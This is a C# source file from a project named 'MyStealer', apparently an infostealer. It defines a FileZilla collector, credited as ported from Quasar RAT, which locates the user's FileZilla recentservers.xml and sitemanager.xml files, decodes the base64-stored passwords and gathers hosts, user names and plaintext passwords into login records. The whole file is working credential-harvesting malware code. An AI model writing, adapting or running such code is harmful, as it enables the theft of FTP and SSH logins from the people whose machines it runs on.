using System;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.IO;
using System.Text;
using System.Xml.Linq;

namespace MyStealer.Collector.Client
{
    /// <summary>
    /// Ported from Quasar RAT
    /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/FtpClients/WinScpPassReader.cs
    /// </summary>
    public class FileZilla : ClientCollector
    {
        public override string Name => "FileZilla";

        private static readonly string dataFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla");

        public override bool IsAvailable() => Directory.Exists(dataFolder);

        public override IImmutableSet<ClientLogin> GetLogins()
        {
            var set = ImmutableHashSet.CreateBuilder<ClientLogin>();

            var recent = ReadXml(set, Path.Combine(dataFolder, "recentservers.xml"));
            var saved = ReadXml(set, Path.Combine(dataFolder, "sitemanager.xml"));
            Logger.Information("Read {recent} recent, {saved} saved FileZilla logins.", recent, saved);

            return set.ToImmutable();
        }

        private int ReadXml(ISet<ClientLogin> set, string path)
        {
            if (!File.Exists(path))
            {
                Logger.Warning("Data file {path} doesn't exists.", path);
                return 0;
            }

            var count = 0;
            try
            {
                using (var stream = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    Logger.Debug("Start parsing: {path}", path);
                    var doc = XDocument.Load(stream);
                    foreach (var server in doc.Root.FirstNode.Document.Elements("Server"))
                    {
                        try
                        {
                            var host = server.Element("Host").Value + ':' + server.Element("Port").Value;
                            var name = server.Element("Name")?.Value ?? "";
                            var protocol = int.Parse(server.Element("Protocol")?.Value ?? "0");
                            var userName = server.Element("User")?.Value ?? "";
                            var pass = server.Element("Pass")?.Value ?? "";
                            var account = server.Element("Account")?.Value ?? "";
                            pass = Encoding.UTF8.GetString(Convert.FromBase64String(pass));

                            count++;
                            set.Add(new ClientLogin
                            {
                                ProgramName = Name,
                                Name = name,
                                Host = host,
                                Protocol = protocol == 1 ? LoginProtocol.SSH : LoginProtocol.FTP,
                                UserName = string.IsNullOrWhiteSpace(account) ? userName : $"{userName} (account: {account})",
                                Password = pass
                            });
                        }
                        catch (Exception ex)
                        {
                            Logger.Warning(ex, "Error parsing a xml login entry.");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error parsing data xml: {path}", path);
            }

            return count;
        }
    }
}
